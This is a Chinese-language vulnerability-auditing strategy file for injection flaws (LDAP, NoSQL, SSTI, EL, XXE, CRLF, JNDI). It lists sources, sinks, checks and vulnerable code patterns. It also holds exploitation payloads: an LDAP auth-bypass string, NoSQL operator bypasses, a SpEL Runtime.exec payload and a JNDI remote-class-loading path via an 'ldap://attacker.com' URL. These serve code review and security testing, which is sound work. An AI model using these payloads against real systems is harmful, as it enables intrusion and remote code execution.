# 策略：通用注入漏洞（injection）

适用类型：LDAP注入、**JNDI注入**、NoSQL注入、SSTI（服务端模板注入）、EL注入（表达式语言注入）、XML注入（XXE）、HTTP头注入、CRLF注入。

> SQL注入、命令注入已有独立策略文件（sqli.md / cmdi.md），请优先使用对应文件。本文件覆盖其余注入类型。

---

## 前置步骤：确认当前注入类型

**必须先执行 §1.1.2 依赖分析**（attack-surface.md 中的"技术栈 Sink 扩展"章节），根据检测到的依赖库确定当前分析的具体注入类型：

| 依赖库 | 注入类型 | 本文件适用节 |
|--------|----------|-------------|
| `ldap3` / `ldap` / `Net::LDAP` / `javax.naming.ldap` | LDAP注入 | §LDAP |
| `pymongo` / `mongoose` / `mongodb` | NoSQL注入 | §NOSQL |
| `jinja2` / `Twig` / `Smarty` / `Velocity` / `Freemarker` | SSTI | §SSTI |
| `spring-expression` / `OGNL` / `MVEL` | EL注入 | §EL |
| XML 解析库（`lxml` / `libxml2` / `DOMParser`）| XXE | §XXE |
| HTTP 框架（任何目标）| CRLF / Header注入 | §CRLF |

---

## §LDAP：LDAP注入

### Sources（用户可控输入点）

- HTTP 请求参数（用户名、邮箱、搜索字段、DN片段）
- 登录表单字段（username / password）
- 搜索/目录查询接口的 query 参数
- API JSON Body 中的 `user` / `filter` / `base_dn` 字段

### Sinks（危险操作点）

- `ldap_search()` / `search()` / `search_s()` / `search_ext()`
- `ldap_bind()` / `bind()` / `simple_bind()`
- `conn.search(search_filter=...)` （ldap3 Python）
- `DirContext.search()` / `InitialDirContext.search()` （Java JNDI）
- `Net::LDAP->search(filter => ...)` （Perl）
- `LdapConnection.Search()` / `DirectorySearcher.Filter` （.NET）
- `ldap_search_ext_s()` （C libldap）

### Key Checks（防护检测）

1. **过滤函数检查**：是否调用了 `escape_filter_chars()` / `ldap_escape()` / `ldap_filter_escape()` 等转义函数？
2. **DN注入检查**：Distinguished Name (DN) 拼接是否包含用户输入？`dn = "cn=" + username` 模式高危。
3. **Blind LDAP注入**：即使有过滤，检查是否过滤了 `*`、`(`、`)`、`\`、`NUL` 全部5个特殊字符。
4. **认证绕过检查**：`bind()` 是否在密码为空时仍返回成功（匿名绑定）？

### Common Patterns（高危模式）

```python
# 高危：直接字符串拼接
search_filter = "(uid=" + username + ")"
conn.search(search_filter=search_filter)

# 高危：DN 拼接
dn = "cn=" + request.form['name'] + ",dc=example,dc=com"
conn.bind(dn, password)

# 需审查：参数化但过滤不完整
search_filter = f"(|(uid={uid})(mail={email}))"  # OR条件可绕过
```

### 利用思路

- 认证绕过：`username=*)(uid=*))(|(uid=*` → filter 变为 `(uid=*)(uid=*))(|(uid=*)` → 永真
- 信息枚举：布尔盲注逐字符提取属性值（userPassword / shadowLastChange）
- 组合链：LDAP注入 → 枚举管理员账户 → 读取密码哈希 → 离线破解 → Auth Bypass → RCE

---

## §NOSQL：NoSQL注入

### Sources

- HTTP 请求 JSON body（`{"user": "$gt": ""}` 类型）
- URL query 参数被直接映射为查询条件
- Header 中的 token / 会话 ID

### Sinks

- `db.collection.find(query)` / `findOne()` / `findMany()`
- `Model.findOne(req.body)` （Mongoose 直接传入 body）
- `db.eval()` / `$where` 操作符（JavaScript执行）
- `MapReduce` 函数中的用户输入

### Key Checks

1. **直接传入检查**：`Model.findOne(req.body)` — body 是否被直接用作查询对象？
2. **操作符过滤**：是否过滤了 `$gt`、`$lt`、`$ne`、`$regex`、`$where` 等 MongoDB 操作符？
3. **$where / eval 检查**：JavaScript 执行点，用户输入直接达到此处 = RCE。

### Common Patterns

```javascript
// 高危：直接使用 req.body 作为查询
User.findOne(req.body).then(...)

// 高危：$where 执行 JS
db.users.find({$where: "this.username == '" + req.query.user + "'"})

// 利用：认证绕过
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

---

## §SSTI：服务端模板注入

### Sources

- 用户输入被传入模板渲染引擎
- URL 参数 / 表单字段 / 数据库内容（二阶注入）
- 邮件模板 / 报告模板中的用户控制字段

### Sinks

- `render_template_string(user_input)` （Flask/Jinja2）
- `env.from_string(user_input).render()` （Jinja2）
- `$twig->render(user_input)` （Twig PHP）
- `velocity.evaluate(ctx, out, "log", user_input)` （Velocity Java）
- `freemarker.template.Template` 从用户输入构建

### Key Checks

1. **模板字符串 vs 模板文件**：`render_template(filename)` 通常安全；`render_template_string(string)` 危险。
2. **沙箱检测**：Jinja2 是否启用了 `SandboxedEnvironment`？能否绕过（`__class__.__mro__` 链）？
3. **二阶注入**：模板内容是否从数据库读取？用户是否能控制数据库内容？

### Common Patterns

```python
# 高危：直接渲染用户输入
return render_template_string(request.args.get('template'))

# 高危：格式化字符串传给模板
template = "Hello " + name + "! Your score: {{score}}"
return render_template_string(template, score=score)

# 探测 payload
{{7*7}}  → 49 (Jinja2/Twig)
${7*7}   → 49 (Freemarker/Velocity)
<%= 7*7 %>  → 49 (ERB/EJS)
```

---

## §EL：表达式语言注入

### Sources

- HTTP 参数被传入 SpEL / OGNL / MVEL 表达式求值
- 配置文件中的表达式（若可被用户修改）
- REST API 的 filter / query 参数

### Sinks

- `ExpressionParser.parseExpression(userInput).getValue()` （Spring SpEL）
- `Ognl.getValue(userInput, context, root)` （OGNL）
- `MVEL.eval(userInput, vars)` （MVEL）
- `ELProcessor.eval(userInput)` （Jakarta EL）

### Key Checks

1. **SpEL 沙箱**：是否使用了 `SimpleEvaluationContext`（受限）而非 `StandardEvaluationContext`（全功能）？
2. **输入是否到达 parseExpression**：追踪用户输入的数据流，确认其到达表达式解析器。

### Common Patterns

```java
// 高危：StandardEvaluationContext + 用户输入
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // RCE
Object result = exp.getValue(context);

// 利用 payload
T(java.lang.Runtime).getRuntime().exec('id')
new java.lang.ProcessBuilder(new String[]{"id"}).start()
```

---

## §XXE：XML外部实体注入

### Sources

- XML 格式的请求 body（Content-Type: application/xml）
- 文件上传（.xml / .docx / .xlsx / .svg）
- SOAP 请求

### Sinks

- XML 解析器（SAX / DOM / StAX）未禁用外部实体
- `DocumentBuilder.parse()` / `SAXParser.parse()` / `XMLReader.parse()`
- `lxml.etree.parse()` / `lxml.etree.fromstring()`（无 `resolve_entities=False`）

### Key Checks

1. **外部实体禁用**：是否设置了 `FEATURE_SECURE_PROCESSING` / `XMLConstants.FEATURE_SECURE_PROCESSING`？
2. **DTD禁用**：是否禁用了 `http://apache.org/xml/features/disallow-doctype-decl`？
3. **lxml resolve_entities**：Python lxml 默认允许外部实体，需显式 `resolve_entities=False`。

---

## §CRLF：CRLF / HTTP头注入

### Sources

- URL 参数被反射到 HTTP 响应头（Location / Set-Cookie / Content-Type）
- 用户名 / 邮箱被写入日志或 HTTP 响应

### Sinks

- `response.setHeader("Location", userInput)`
- `response.addCookie(new Cookie(name, userInput))`
- 日志写入（写入含 `\r\n` 的用户输入）

### Key Checks

1. **`\r\n` 过滤**：是否过滤了 `%0d%0a` / `\r\n` / `\n`？
2. **头部拼接**：用户输入是否直接拼接到 HTTP 响应头值？

---

## §JNDI：JNDI 注入（区别于 LDAP 注入）

> **重要区分**：LDAP 注入 = 控制 LDAP **filter/DN 的内容**；JNDI 注入 = 控制 **URL 字符串本身**（`ldap://attacker/...`）。两者触发机制和利用效果完全不同。

### 与 LDAP 注入的核心区别

| | LDAP 注入 | JNDI 注入 |
|-|----------|----------|
| 攻击者控制 | filter 字符串内容（如 `uid=*`） | URL 整体（`ldap://attacker.com/...`） |
| Sink 形式 | `search(base, filter)` 中 filter 可控 | `lookup(url)` 或 `search(url, null)` 中 url 可控 |
| 效果 | 信息枚举 / 认证绕过 | SSRF + 潜在远程类加载 RCE |

### Sources（用户可控输入点）

- HTTP 请求体中的 DER/PEM 格式 X.509 证书（`signedData.certificate` / `adminCertificate`）
- HTTP Header 中的客户端证书（`ssl_client_cert` / `X-SSL-Client-Cert`）
- 任何最终传入证书解析函数（BouncyCastle / Java `CertificateFactory`）的外部数据

### Sinks（危险操作点）

- `new InitialDirContext().search(url, null)` ← **核心 Sink**
- `new InitialContext().lookup(url)`
- `new InitialDirContext(env).search(url, filter)` — url 为完整 `ldap://` URI 时
- OCSP 验证外部请求：`CertPathValidator` + 外部 OCSP URL（退化为 HTTP SSRF）
- CRL 下载：`X509CRL` 解析中的 Distribution Point URL 外部获取（退化为 HTTP SSRF）

### 典型触发路径：X.509 AIA 扩展

```
攻击者构造含恶意 AIA 扩展的证书
  cert.AIA(id_ad_caIssuers) = "ldap://attacker.com/cn=evil,dc=com"
  ↓ 提交到 @NoAuth 端点
CertificateVerifier.verifyCertificate(cert, ..., skipExternalCommunication=false, ...)
  ↓
getIntermediateCertificates(cert, ldapHostname)
  ↓ extensionValue = cert.getExtensionValue("1.3.6.1.5.5.7.1.1")
  ↓ url = accessDescription.getAccessLocation().getName().toString()
new InitialDirContext().search(url, null)  ← JNDI Sink，url 完全攻击者可控
```

### Key Checks（防护检测）

1. **`skipExternalCommunication` 默认值**：Java `boolean` 原始类型默认 `false`，即默认执行外部通信——这是触发条件。
2. **`overrideLdapUrl` 是否能阻止利用**：仅当 cert URL 无 authority 时才替换主机；若 cert URL 含 authority（`ldap://attacker.com/...`），则不替换，攻击者仍可控 host。
3. **证书来源是否攻击者可控**：来自 HTTP body（DER bytes / PEM string）= 完全可控；来自 TLS 握手客户端证书（自签名）= 可控。
4. **JDK 版本**：JDK >= 8u191/11.0.1 时 `trustURLCodebase=false`，无法直接加载远程类；但本地 Gadget（Tomcat BeanFactory + ELProcessor）仍可实现 RCE，且 SSRF/OOB 不受影响。

### 利用思路

- **OOB 确认**：向 Burp Collaborator / interactsh 发请求，确认漏洞存在
- **JDK < 8u191**：`ldap://attacker/Exploit` → 返回含 `javaClassName` 的 LDAP entry → JVM 加载远程类 → RCE
- **JDK >= 8u191**：通过 Tomcat `BeanFactory` + `ELProcessor.eval()` 等本地 Gadget 链实现 RCE
- **SSRF 横向**：向内网 LDAP/HTTP 服务发请求，结合 LDAP relay 或内网探测

### 搜索关键词（Java）

```bash
rg -n "InitialDirContext\|InitialContext\.lookup\|NamingManager"
rg -n "getExtensionValue\|authorityInfoAccess\|id_ad_caIssuers\|getIntermediateCert"
rg -n "skipExternalCommunication\|skipX509ExternalChecks"
rg -n "CertificateFactory\|verifyCertificate\|validateChain"
```

---

## 多类型共用规则

### 置信度判定

| 条件 | 置信度 |
|------|--------|
| Source 可控 + 无转义/过滤 + 到达 Sink | HIGH |
| Source 可控 + 过滤不完整（只过滤部分特殊字符）| HIGH |
| Source 可控 + 有转义但可绕过（编码绕过）| MEDIUM-HIGH |
| 过滤完整但有绕过向量需验证 | MEDIUM |
| 间接可控（需认证）| CONDITIONAL |

### 组合链升级（结合 §2.8）

- LDAP注入 → 枚举管理员 → 密码哈希破解 → 登录 → RCE
- NoSQL $where → JavaScript 执行 → RCE（直接）
- SSTI → 沙箱逃逸 → `os.system()` → RCE
- EL 注入（SpEL StandardContext）→ `Runtime.exec()` → RCE
- XXE → 任意文件读取 → 配置文件密码 → Auth Bypass → RCE
